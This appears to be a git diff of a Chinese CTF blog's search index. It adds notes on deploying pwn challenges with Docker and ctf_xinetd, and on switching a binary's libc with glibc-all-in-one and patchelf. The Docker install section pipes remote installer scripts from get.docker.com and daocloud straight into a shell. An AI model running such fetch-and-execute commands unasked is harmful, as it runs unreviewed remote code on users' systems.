       <categories>
         <category>比赛WriteUp</category>
       </categories>
+  </entry>
+  <entry>
+    <title>Pwn(ubuntu_docker)</title>
+    <url>/article/Pwn_ubuntu_docker/</url>
+    <content><![CDATA[<h2 id="一、Docker-安装"><a href="#一、Docker-安装" class="headerlink" title="一、Docker 安装"></a>一、Docker 安装</h2><h3 id="1-使用官方安装脚本自动安装"><a href="#1-使用官方安装脚本自动安装" class="headerlink" title="1.使用官方安装脚本自动安装"></a>1.使用官方安装脚本自动安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -fsSL https:&#x2F;&#x2F;get.docker.com | bash -s docker --mirror Aliyun</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用国内 daocloud 一键安装命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;docker | sh</span><br></pre></td></tr></table></figure>
+
+<p>apt安装docker-compose：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install docker docker-compose -y</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-切换镜像源"><a href="#2-切换镜像源" class="headerlink" title="2.切换镜像源"></a>2.切换镜像源</h3><p><code>vim /etc/docker/daemon.json</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt; EOF</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">service docker restart</span><br></pre></td></tr></table></figure>
+
+<h2 id="二、Docker-简单使用"><a href="#二、Docker-简单使用" class="headerlink" title="二、Docker 简单使用"></a>二、Docker 简单使用</h2><p>我们可以通过以下几条命令简单测试一下docker是否安装成功：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">service docker start</span><br><span class="line">docker images</span><br><span class="line"><span class="comment">#hello-world为其自带的一个image</span></span><br><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
+
+<p>常用指令：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line"><span class="comment">#查看镜像</span></span><br><span class="line">docker run -d [images_name/<span class="built_in">id</span>] /<span class="built_in">bin</span>/bash</span><br><span class="line"><span class="comment">#run：运行 镜像 从而生成 容器; -d：后台运行容器; [images_name/id]：换成镜像的id或者名称; /bin/bash：运行镜像的权限</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="comment">#查看在运行的容器</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment">#查看所有容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it [container-<span class="built_in">id</span>] /<span class="built_in">bin</span>/bash</span><br><span class="line"><span class="comment">#进入容器; exec:在运行的容器中执行命令; -i:互交界面, -t:分配一个伪终端; container-id:换成容器id</span></span><br><span class="line">docker rm [container-<span class="built_in">id</span>]</span><br><span class="line"><span class="comment">#删除容器</span></span><br><span class="line">docker rmi [images-name]</span><br><span class="line"><span class="comment">#删除镜像</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="三、ctf-xinetd下载与使用"><a href="#三、ctf-xinetd下载与使用" class="headerlink" title="三、ctf_xinetd下载与使用"></a>三、ctf_xinetd下载与使用</h2><p>从GitHub上下载<a href="https://github.com/Eadom/ctf_xinetd">ctf_xinetd</a></p>
+<h3 id="1-放题目"><a href="#1-放题目" class="headerlink" title="1.放题目"></a>1.放题目</h3><p>把题目可执行文件和flag放在ctf_xinetd/bin中<br>ps：不要把 bin 作为题目的名字</p>
+<p><img src="https://img-blog.csdnimg.cn/20201103210513145.png#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="2-修改ctf-xinetd文件"><a href="#2-修改ctf-xinetd文件" class="headerlink" title="2.修改ctf.xinetd文件"></a>2.修改ctf.xinetd文件</h3><p>回到ctf_xinetd目录下，修改ctf.xinetd<br>把图片箭头指向的 <code>helloworld</code> 改成bin文件夹中题目的名字<br>保存退出</p>
+<p><img src="https://img-blog.csdnimg.cn/20201103210745998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h3 id="3-Build"><a href="#3-Build" class="headerlink" title="3.Build"></a>3.Build</h3><p>在ctf_xinetd目录下 <code>docker build -t &quot;pwn&quot; .</code></p>
+<h3 id="4-Run"><a href="#4-Run" class="headerlink" title="4.Run"></a>4.Run</h3><p>在ctf_xinetd目录下 <code>docker run -d -p &quot;0.0.0.0:pub_port:9999&quot; -h &quot;pwn&quot; --name=&quot;pwn&quot; pwn</code><br>-h：指定容器的hostname<br>pub_port：改成你想放置的端口号，建议如8001，8002…等<br>pub_port is the port you want to expose to the public network.</p>
+<p>此时输入docker ps 会发现题目容器已经启动了，可以nc 0.0.0.0 pub_port进行测试一下（pub_port：改成你想放置的端口号）</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.runoob.com/docker/ubuntu-docker-install.html">docker | 菜鸟教程</a></p>
+<p><a href="https://blog.csdn.net/qq_40173126/article/details/83552307?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-3-83552307.nonecase&utm_term=pwn%E5%87%BA%E9%A2%98%E6%BA%90%E4%BB%A3%E7%A0%81&spm=1000.2123.3001.4430">使用Docker进行Pwn题环境部署</a></p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+        <tag>ubuntu</tag>
+        <tag>题目环境</tag>
+      </tags>
   </entry>
   <entry>
     <title>CTFShow_0x1</title>
@@ -970,6 +970,50 @@
       </categories>
   </entry>
   <entry>
+    <title>glibc-all-in-one</title>
+    <url>/article/glibc-all-in-one/</url>
+    <content><![CDATA[<h1 id="记glibc-all-in-one使用"><a href="#记glibc-all-in-one使用" class="headerlink" title="记glibc-all-in-one使用"></a>记glibc-all-in-one使用</h1><span id="more"></span>
+
+<p><a href="https://mp.weixin.qq.com/s/UAQswvnasJ0a40ibSy4ppg">参考</a></p>
+<h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h1><h2 id="glibc-all-in-one下载"><a href="#glibc-all-in-one下载" class="headerlink" title="glibc-all-in-one下载"></a>glibc-all-in-one下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br></pre></td></tr></table></figure>
+
+<h2 id="glibc-all-in-one安装"><a href="#glibc-all-in-one安装" class="headerlink" title="glibc-all-in-one安装"></a>glibc-all-in-one安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo python3 update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><img src="/article/glibc-all-in-one/image-20211012172502704.png" alt="image-20211012172502704"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download 2.31-0ubuntu9_amd64</span><br></pre></td></tr></table></figure>
+
+<h3 id="old-list"><a href="#old-list" class="headerlink" title="old_list"></a>old_list</h3><p>和上面差不多</p>
+<p><img src="/article/glibc-all-in-one/image-20211012172551035.png" alt="image-20211012172551035"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download_old 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure>
+
+<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><h2 id="patchelf下载"><a href="#patchelf下载" class="headerlink" title="patchelf下载"></a>patchelf下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br></pre></td></tr></table></figure>
+
+<h2 id="patchelf安装"><a href="#patchelf安装" class="headerlink" title="patchelf安装"></a>patchelf安装</h2><p>这里我的ubuntu16没有报错，挺顺利</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh //如果报错 ./bootstrap.sh: 2: autoreconf: not found                 </span><br><span class="line">				//执行这个   sudo apt-get install autoconf automake libtool</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<h1 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one$ sudo ./download 2.27-3ubuntu1_amd64</span><br></pre></td></tr></table></figure>
+
+<p>打开隐藏文件</p>
+<p><code>Ctrl + h</code></p>
+<p>可以先在这个目录下 <code>pwd</code>一下</p>
+<p><img src="/article/glibc-all-in-one/image-20211012180509161.png" alt="image-20211012180509161"></p>
+<p><img src="/article/glibc-all-in-one/image-20211012180244757.png" alt="image-20211012180244757"></p>
+<p>解压下载的<code>deb</code>包到<code>.debug</code>中</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one/debs$ sudo dpkg -X [libc6_2.27-3ubuntu1_amd64.deb] /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/.debug</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>
+
+<p>然后利用patchelf工具修改elf程序所需的动态链接库</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[ld-2.27.so] ./ciscn_final_3</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[libc-2.27.so] ./ciscn_final_3</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>2020湖湘杯hxb</title>
     <url>/article/hxb_2020/</url>
     <content><![CDATA[<h1 id="2020湖湘杯hxb"><a href="#2020湖湘杯hxb" class="headerlink" title="2020湖湘杯hxb"></a>2020湖湘杯hxb</h1><span id="more"></span>
@@ -1037,50 +1081,6 @@
 ]]></content>
       <categories>
         <category>比赛WriteUp</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>glibc-all-in-one</title>
-    <url>/article/glibc-all-in-one/</url>
-    <content><![CDATA[<h1 id="记glibc-all-in-one使用"><a href="#记glibc-all-in-one使用" class="headerlink" title="记glibc-all-in-one使用"></a>记glibc-all-in-one使用</h1><span id="more"></span>
-
-<p><a href="https://mp.weixin.qq.com/s/UAQswvnasJ0a40ibSy4ppg">参考</a></p>
-<h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h1><h2 id="glibc-all-in-one下载"><a href="#glibc-all-in-one下载" class="headerlink" title="glibc-all-in-one下载"></a>glibc-all-in-one下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br></pre></td></tr></table></figure>
-
-<h2 id="glibc-all-in-one安装"><a href="#glibc-all-in-one安装" class="headerlink" title="glibc-all-in-one安装"></a>glibc-all-in-one安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo python3 update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><img src="/article/glibc-all-in-one/image-20211012172502704.png" alt="image-20211012172502704"></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download 2.31-0ubuntu9_amd64</span><br></pre></td></tr></table></figure>
-
-<h3 id="old-list"><a href="#old-list" class="headerlink" title="old_list"></a>old_list</h3><p>和上面差不多</p>
-<p><img src="/article/glibc-all-in-one/image-20211012172551035.png" alt="image-20211012172551035"></p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download_old 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure>
-
-<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><h2 id="patchelf下载"><a href="#patchelf下载" class="headerlink" title="patchelf下载"></a>patchelf下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br></pre></td></tr></table></figure>
-
-<h2 id="patchelf安装"><a href="#patchelf安装" class="headerlink" title="patchelf安装"></a>patchelf安装</h2><p>这里我的ubuntu16没有报错，挺顺利</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh //如果报错 ./bootstrap.sh: 2: autoreconf: not found                 </span><br><span class="line">				//执行这个   sudo apt-get install autoconf automake libtool</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<h1 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one$ sudo ./download 2.27-3ubuntu1_amd64</span><br></pre></td></tr></table></figure>
-
-<p>打开隐藏文件</p>
-<p><code>Ctrl + h</code></p>
-<p>可以先在这个目录下 <code>pwd</code>一下</p>
-<p><img src="/article/glibc-all-in-one/image-20211012180509161.png" alt="image-20211012180509161"></p>
-<p><img src="/article/glibc-all-in-one/image-20211012180244757.png" alt="image-20211012180244757"></p>
-<p>解压下载的<code>deb</code>包到<code>.debug</code>中</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one/debs$ sudo dpkg -X [libc6_2.27-3ubuntu1_amd64.deb] /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/.debug</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>
-
-<p>然后利用patchelf工具修改elf程序所需的动态链接库</p>
-<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[ld-2.27.so] ./ciscn_final_3</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[libc-2.27.so] ./ciscn_final_3</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
       </categories>
   </entry>
   <entry>
